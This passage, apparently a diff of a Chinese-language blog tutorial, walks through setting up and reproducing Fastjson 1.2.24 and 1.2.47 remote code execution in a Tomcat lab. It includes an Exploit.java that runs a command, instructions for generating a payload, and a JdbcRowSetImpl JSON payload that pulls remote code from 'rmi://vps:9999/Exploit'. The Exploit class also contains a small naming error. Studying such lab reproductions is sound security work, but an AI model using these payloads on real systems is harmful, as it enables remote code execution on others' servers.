@@ -126,55 +126,75 @@
         </header>
 
         <section class="post-content">
-            <h1 id="Fastjson-RCE漏洞环境搭建及复现"><a href="#Fastjson-RCE漏洞环境搭建及复现" class="headerlink" title="Fastjson-RCE漏洞环境搭建及复现"></a>Fastjson-RCE漏洞环境搭建及复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><h4 id="fastjson-1-2-24"><a href="#fastjson-1-2-24" class="headerlink" title="fastjson_1.2.24"></a>fastjson_1.2.24</h4><ul>
+            <h1 id="Fastjson-RCE漏洞环境搭建及复现"><a href="#Fastjson-RCE漏洞环境搭建及复现" class="headerlink" title="Fastjson-RCE漏洞环境搭建及复现"></a>Fastjson-RCE漏洞环境搭建及复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><h4 id="fastjson-1-2-24"><a href="#fastjson-1-2-24" class="headerlink" title="fastjson_1.2.24"></a>fastjson_1.2.24</h4><blockquote>
+<ul>
 <li>tomcat运行环境</li>
 </ul>
-<p>tomcat官网下载，7、8、9都可以<br>启动命令：<br>windows<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&gt; 存放路径\tomcat9\bin\catalina.bat run</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<p> tomcat官网下载，7、8、9都可以<br> 启动命令：<br> windows<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&gt; 存放路径\tomcat9\bin\catalina.bat run</span><br></pre></td></tr></table></figure></p>
 <p>Linux<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#&gt; 存放路径\tomcat9\bin\catalina.sh run</span><br></pre></td></tr></table></figure></p>
+<blockquote>
 <ul>
 <li>java运行环境</li>
 </ul>
+</blockquote>
 <p>官网下载JDK，推荐1.8，安装<br>配置环境变量<br>命令行成功运行<code>java --version</code>和<code>javac -version</code>表示java运行环境配置成功。</p>
+<blockquote>
 <ul>
 <li>fastjson包及实例</li>
 </ul>
+</blockquote>
 <p>fastjson-1.0.war<a href="https://raw.githubusercontent.com/yaofeifly/vulhub/master/fastjson/vuln/fastjson-1.0.war" target="_blank" rel="noopener">https://raw.githubusercontent.com/yaofeifly/vulhub/master/fastjson/vuln/fastjson-1.0.war</a>(fastjson-1.2.24)<br>把war文件部署到tomcat服务器。<br>Manager APP -&gt; 部署 -&gt; WAR file to deploy -&gt; 浏览 -&gt; 部署<br>访问<code>http://ip:port/fastjson-1.0/</code>页面显示<code>Hello World</code>为部署成功。</p>
+<blockquote>
 <ul>
 <li>payload</li>
 </ul>
+</blockquote>
 <ol>
 <li>fastjson_vulhub_poc<a href="https://github.com/vulhub/vulhub/tree/master/fastjson" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/fastjson</a></li>
 <li>fastjson_1.2.24_payload获取：<br>修改<code>\fastjson\vuln\src\main\java\Poc.java</code>中<code>Runtime.getRuntime().exec(&quot;cmd&quot;);</code>cmd为你想要执行的命令.<br>修改后编译Poc.java：<code>javac Poc.java</code>，会生成一个名为<code>Poc.class</code>的文件。<br>然后把<code>fastjson\vuln\exploit.php</code>文件和<code>Poc.class</code>放在同一目录下，修改<code>exploit.php</code>中<code>$bytes = file_get_contents(&#39;zip://&#39; . __DIR__ . &#39;/fastjson-1.0.war#WEB-INF/classes/Poc.class&#39;);</code>为<code>$bytes = file_get_contents(&#39;./Poc.class&#39;);</code>。命令行运行<code>php exploit.php</code>，输出的内容就是payload。</li>
 </ol>
+<blockquote>
 <ul>
 <li>burp suite</li>
 </ul>
-<p>百度下载</p>
-<h4 id="fastjson-1-2-47"><a href="#fastjson-1-2-47" class="headerlink" title="fastjson_1.2.47"></a>fastjson_1.2.47</h4><ul>
+</blockquote>
+<p> 百度下载</p>
+<h4 id="fastjson-1-2-47"><a href="#fastjson-1-2-47" class="headerlink" title="fastjson_1.2.47"></a>fastjson_1.2.47</h4><blockquote>
+<ul>
 <li>maven编译打包环境</li>
 </ul>
+</blockquote>
 <ol>
 <li>一般java的IDEA都会带</li>
 <li>kali也自带</li>
 <li>官网下载<a href="https://maven.apache.org/download.cgi" target="_blank" rel="noopener">https://maven.apache.org/download.cgi</a>，<br>直接解压就能用，记得添加环境变量。</li>
 </ol>
+<blockquote>
 <ul>
 <li>marshalsec-0.0.3-SNAPSHOT-all.jar</li>
 </ul>
-<p>marshalsec源码<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">https://github.com/mbechler/marshalsec</a><br>下载源码后一般会打包成jar文件后使用<br>根目录（也就是有pom.xml的目录）运行<code>mvn package</code>，这是打包java项目的命令，他会自己下载依赖，这个过程有点长，慢慢等吧。（我yo）</p>
+</blockquote>
+<p>marshalsec源码<a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">https://github.com/mbechler/marshalsec</a><br>下载源码后一般会打包成jar文件后使用<br>根目录（也就是有pom.xml的目录）运行<code>mvn clean package</code>，编译得到target\marshalsec-0.0.3-SNAPSHOT.jar。<br>这个过程有点长，慢慢等吧。本地用时一个多小时，vps用时2分钟。</p>
+<blockquote>
 <ul>
 <li>fastjson包及实例</li>
 </ul>
+</blockquote>
 <p>还是利用上面搭好的环境，把tomcat根目录<code>fastjson-1.0\WEB-INF\lib</code>目录下的<code>fastjson-1.2.24.jar</code>换成<code>fastjason-1.2.47.jar</code>，重启tomcat。<br>不要问<code>fastjason-1.2.47.jar</code>从哪里来。</p>
+<blockquote>
 <ul>
 <li>Exploit.class</li>
 </ul>
+</blockquote>
 <p>创建文件 Exploit.java<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">        Exploit1 e = <span class="keyword">new</span> Exploit1();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
 <p>编译 Exploit.java，命令如下，生成<code>Exploit.class</code>。<br><code>javac Exploit.java</code></p>
+<blockquote>
 <ul>
 <li>Payload<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"a"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"java.lang.Class"</span>,</span><br><span class="line">        <span class="attr">"val"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span></span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"b"</span>:&#123;</span><br><span class="line">        <span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,</span><br><span class="line">        <span class="attr">"dataSourceName"</span>:<span class="string">"rmi://vps:9999/Exploit"</span>,</span><br><span class="line">        <span class="attr">"autoCommit"</span>:<span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 </li>
 </ul>
+</blockquote>
 <h2 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h2><h3 id="fastjson-1-2-24-RCE"><a href="#fastjson-1-2-24-RCE" class="headerlink" title="fastjson_1.2.24_RCE"></a>fastjson_1.2.24_RCE</h3><p>打开burp，设置好代理。<br>打开浏览器，设置好代理。<br>访问<code>http://ip:port/fastjson-1.0/</code>，把burp抓到的包发送到重放模块，<br>修改http协议为POST,请求体为<br><code>{&quot;name&quot;:&quot;john&quot;,age:12}</code><br>点击<code>Go</code>，得到如下响应<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 </span><br><span class="line">Content-Type: application/json</span><br><span class="line">Date: Sat, 10 Aug 2019 15:05:08 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 51</span><br><span class="line"></span><br><span class="line">&#123;&quot;data&quot;:&quot;Hello john, Your age is 12&quot;,&quot;success&quot;:200&#125;</span><br></pre></td></tr></table></figure></p>
 <p>说明fastjson起作用了。<br>下面开始利用，修改请求体为上面获取的payload，点击发送<br><img src="https://image-langke.bj.bcebos.com/hexo-neirongpeitu/漏洞复现/fastjson_1.2.24_calc.png" alt="https://image-langke.bj.bcebos.com/hexo-neirongpeitu/漏洞复现/fastjson_1.2.24_calc.png"></p>
 <h3 id="fastjson-1-2-27-RCE"><a href="#fastjson-1-2-27-RCE" class="headerlink" title="fastjson_1.2.27_RCE"></a>fastjson_1.2.27_RCE</h3><ol>
